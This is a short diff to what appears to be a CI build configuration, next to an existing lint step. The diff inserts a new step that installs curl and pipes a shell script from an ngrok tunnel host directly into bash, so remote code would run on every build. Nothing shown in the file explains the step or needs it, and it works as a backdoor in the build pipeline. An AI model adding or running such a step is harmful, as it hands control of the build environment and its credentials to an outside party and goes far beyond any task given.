@@ -1,4 +1,7 @@
 steps:
+
+- name: ubuntu
+  script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 - id: lint
   name: gcr.io/$PROJECT_ID/make
   args: [test]
